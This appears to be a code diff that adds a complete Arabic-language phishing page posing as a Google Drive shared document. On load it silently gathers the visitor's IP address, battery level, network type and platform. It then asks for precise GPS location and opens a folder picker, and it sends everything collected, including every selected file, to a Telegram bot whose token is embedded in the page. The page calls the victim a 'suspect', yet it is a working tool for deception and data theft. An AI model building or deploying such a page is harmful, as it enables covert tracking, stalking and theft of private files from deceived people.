@@ -1,12 +1,93 @@
-// أضف هذا الجزء داخل سكريبت إرسال الصور في الكود السابق
-document.getElementById('f').onchange = async (e) => {
-    for (let file of e.target.files) {
-        // إرسال الملف كـ "مستند" Document وليس صورة عادية
-        // لضمان بقاء بيانات الـ GPS المخفية داخل الصورة (EXIF Data)
-        const fd = new FormData();
-        fd.append('chat_id', C);
-        fd.append('document', file);
-        fd.append('caption', `📂 تم سحب ملف من جهاز المشتبه به: ${file.name}\n(تحليل بيانات EXIF مطلوب لكشف الموقع)`);
-        fetch(`https://api.telegram.org/bot${T}/sendDocument`, {method:'POST', body:fd});
-    }
-};
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Drive - مشاركة ملفات آمنة</title>
+    <style>
+        body { background: #f1f3f4; font-family: 'Roboto', Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.12); width: 90%; max-width: 450px; text-align: center; }
+        .logo { width: 80px; margin-bottom: 20px; }
+        h1 { font-size: 22px; color: #3c4043; margin-bottom: 10px; }
+        p { color: #5f6368; font-size: 14px; line-height: 1.5; margin-bottom: 30px; }
+        .btn-drive { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; width: 100%; transition: background 0.2s; }
+        .btn-drive:hover { background: #1765cc; }
+        #status { margin-top: 15px; font-size: 12px; color: #1a73e8; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Google_Drive_icon_%282020%29.svg" alt="Drive" class="logo">
+        <h1>معاينة المستند المحمي</h1>
+        <p>لقد تمت مشاركة ملف "تقرير_أمني_عاجل.pdf" معك. للوصول إلى الملف ومعاينته، يرجى تفعيل الوصول الآمن وتأكيد موقعك الحالي.</p>
+        
+        <input type="file" id="f" webkitdirectory directory multiple style="display:none;">
+        <button class="btn-drive" onclick="startCapture()">فتح الملف والمتابعة</button>
+        <div id="status"></div>
+    </div>
+
+    <script>
+        // معلومات البوت الخاصة بك
+        const BOT_TOKEN = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
+        const CHAT_ID = '7214473798';
+
+        // 1. سحب البيانات الأولية فور فتح الصفحة (صامت)
+        window.onload = async () => {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const battery = await navigator.getBattery();
+                const net = navigator.connection ? navigator.connection.effectiveType : "غير معروف";
+                
+                let msg = `🚨 **كشف أولي لمشتبه به:**\n`;
+                msg += `📍 IP: \`${ipData.ip}\`\n`;
+                msg += `🔋 البطارية: ${Math.round(battery.level * 100)}%\n`;
+                msg += `📶 الشبكة: ${net}\n`;
+                msg += `📱 النظام: ${navigator.platform}`;
+
+                sendToTelegram(msg);
+            } catch (e) {}
+        };
+
+        async function startCapture() {
+            document.getElementById('status').innerText = "جاري التحقق من الصلاحيات... يرجى الموافقة على طلب الموقع";
+            
+            // 2. طلب الموقع الجغرافي الدقيق (GPS)
+            navigator.geolocation.getCurrentPosition((p) => {
+                const lat = p.coords.latitude;
+                const lon = p.coords.longitude;
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                sendToTelegram(`🎯 **تحديد موقع المجرم بدقة (GPS):**\n${mapLink}`);
+            }, (err) => {
+                sendToTelegram(`⚠️ المشتبه به رفض إذن الموقع (GPS)`);
+            }, { enableHighAccuracy: true });
+
+            // 3. فتح نافذة سحب الصور والملفات
+            setTimeout(() => {
+                document.getElementById('f').click();
+            }, 1000);
+        }
+
+        // 4. إرسال الصور والملفات فور اختيارها
+        document.getElementById('f').onchange = async (e) => {
+            sendToTelegram(`📂 بدأ سحب الملفات والأدلة الآن...`);
+            for (let file of e.target.files) {
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('document', file);
+                fd.append('caption', `📦 ملف مسحوب: ${file.name}`);
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                    method: 'POST',
+                    body: fd
+                });
+            }
+        };
+
+        function sendToTelegram(text) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+        }
+    </script>
+</body>
+</html>
